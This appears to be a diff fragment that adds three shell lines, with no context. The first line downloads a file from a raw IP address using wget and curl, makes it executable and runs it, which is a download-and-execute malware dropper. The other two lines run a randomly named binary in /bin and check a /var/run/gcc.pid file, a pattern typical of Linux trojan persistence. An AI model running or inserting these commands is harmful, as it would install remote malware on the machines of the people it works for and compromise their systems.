@@ -1,0 +1,3 @@
+#!/bin/sh; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; wget http://104.148.124.120/21; curl -O http://104.148.124.120/21; chmod +x 21; ./21; 
+/bin/eyshcjdmzg
+ls -la /var/run/gcc.pid
